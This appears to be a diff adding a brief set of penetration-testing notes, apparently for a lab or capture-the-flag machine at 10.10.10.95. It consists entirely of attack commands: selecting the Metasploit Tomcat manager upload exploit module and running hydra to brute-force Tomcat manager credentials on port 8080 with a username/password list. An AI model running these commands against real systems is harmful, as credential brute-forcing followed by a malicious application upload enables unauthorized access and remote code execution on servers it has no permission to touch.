@@ -1,0 +1,7 @@
+use multi/http/tomcat_mgr_upload
+
+hydra -C usrpass.txt 10.10.10.95 -s 8080 http-get /manager/html
+
+
+
+hydra -C usrpass.txt http-get://10.10.10.95:8080/manager/html -vv
